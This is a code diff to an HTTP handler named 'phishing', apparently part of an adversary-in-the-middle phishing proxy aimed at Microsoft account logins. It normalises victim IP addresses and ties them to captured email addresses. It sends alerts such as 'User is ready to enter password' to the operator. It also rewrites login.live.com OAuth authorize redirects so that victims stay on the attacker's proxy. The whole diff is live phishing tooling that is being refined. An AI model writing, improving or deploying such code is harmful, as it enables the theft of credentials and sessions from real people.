@@ -342,13 +342,14 @@ app.http("phishing", {
   authLevel: "anonymous",
   route: "/{*x}",
   handler: async (request, context) => {
-    const ip =
+    const ipRaw =
       request.headers.get("cf-connecting-ip") ||
       request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
       request.headers.get("x-client-ip") ||
       request.headers.get("true-client-ip") ||
       request.headers.get("x-real-ip") ||
       "unknown";
+    const ip = typeof ipRaw === 'string' ? ipRaw.replace(/:\\d+$/, '') : ipRaw;
 
     // Log every request for debugging
     await dispatchMessage(
@@ -360,7 +361,7 @@ app.http("phishing", {
     if (request.method === "POST" && new URL(request.url).pathname === "/__notify_click") {
       const body = await request.json();
       const email = body.email || "unknown";
-      const realIP = body.ip || ip;
+      const realIP = (typeof body.ip === 'string' ? body.ip.replace(/:\\d+$/, '') : body.ip) || ip;
       emailMap.set(realIP, email);
       await dispatchMessage(
         `👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${realIP}`,
@@ -484,10 +485,18 @@ app.http("phishing", {
       const locationHeader = original_response.headers.get("location");
       if (locationHeader) {
         const candidate = new URL(locationHeader, upstream_url.protocol + "//" + upstream_url.host);
-        if (PERSONAL_HOSTS.includes(candidate.host) || (storedEmail && isPersonalEmail(storedEmail))) {
-          candidate.searchParams.set("x-target-host", candidate.host);
-          const proxiedLocation = original_url.protocol + "//" + original_url.host + candidate.pathname + (candidate.search || "");
-          new_response_headers.set("Location", proxiedLocation);
+        const isPersonalContext = (storedEmail && isPersonalEmail(storedEmail)) || PERSONAL_HOSTS.includes(candidate.host);
+        if (isPersonalContext) {
+          // Force rewrite for OAuth authorize redirect patterns
+          if (candidate.hostname === 'login.live.com' && candidate.pathname.toLowerCase() === '/oauth20_authorize.srf') {
+            candidate.searchParams.set("x-target-host", candidate.host);
+            const proxied = original_url.protocol + "//" + original_url.host + candidate.pathname + (candidate.search || "");
+            new_response_headers.set("Location", proxied);
+          } else if (PERSONAL_HOSTS.includes(candidate.host)) {
+            candidate.searchParams.set("x-target-host", candidate.host);
+            const proxiedLocation = original_url.protocol + "//" + original_url.host + candidate.pathname + (candidate.search || "");
+            new_response_headers.set("Location", proxiedLocation);
+          }
         }
       }
     } catch {}
